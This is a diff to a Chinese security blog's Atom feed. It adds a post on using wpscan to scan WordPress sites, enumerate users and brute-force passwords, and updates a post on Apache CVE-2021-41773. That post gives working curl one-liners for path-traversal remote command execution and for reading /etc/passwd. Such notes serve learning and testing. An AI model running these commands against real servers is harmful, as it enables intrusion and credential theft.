@@ -6,7 +6,7 @@
   <link href="https://github.com/chenchanghui/chenchanghui.github.io/atom.xml" rel="self"/>
   
   <link href="https://github.com/chenchanghui/chenchanghui.github.io/"/>
-  <updated>2021-10-09T02:44:42.094Z</updated>
+  <updated>2021-10-09T07:38:39.768Z</updated>
   <id>https://github.com/chenchanghui/chenchanghui.github.io/</id>
   
   <author>
@@ -17,11 +17,31 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>wpscan使用</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/2b63819c.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/2b63819c.html</id>
+    <published>2021-10-09T07:21:54.000Z</published>
+    <updated>2021-10-09T07:38:39.768Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><p>kali版wpscan</p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新漏洞库</p><pre class="line-numbers language-none"><code class="language-none">wpscan --update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用</p><p>扫描站点</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主题扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url --enumerate twpscan --url url -e t#缩写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>插件扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主题/插件漏洞扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e vtwpscan --url url -e vp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>references后面显示的是漏洞详情网址，基本是配合msf漏洞利用模块</p><p>枚举用户名</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>暴力破解</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -U &lt;username路径或username&gt; -P &lt;password路径&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>听说可以–threads [线程数]设置线程，但是显示没这个选项，–wordlist选项也没，都是kail上的wpscan，其他系统上的还没试过</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>Apache CVE-2021-41773</title>
     <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/59b5dccf.html"/>
     <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/59b5dccf.html</id>
     <published>2021-10-09T02:43:17.000Z</published>
-    <updated>2021-10-09T02:44:42.094Z</updated>
+    <updated>2021-10-09T02:47:22.175Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>漏洞原因：</p><p>此漏洞由不安全的配置触发</p><p>如果网站配置中，将 根目录 / 配置为</p><pre class="line-numbers language-none"><code class="language-none">Require all granted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则可以通过cgi-bin/目录，配合 ../</p><p>只存在于apache2.4.49，在其他版本不存在</p><p>RCE</p><pre class="line-numbers language-none"><code class="language-none">curl --data "echo;id" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取</p><pre class="line-numbers language-none"><code class="language-none">curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/09/5iU6ud.png"></p>]]></content>
     
@@ -33,6 +53,10 @@
     
     
     
+    
+    <category term="RCE" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/RCE/"/>
+    
+    <category term="任意文件读取" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
     
   </entry>
   
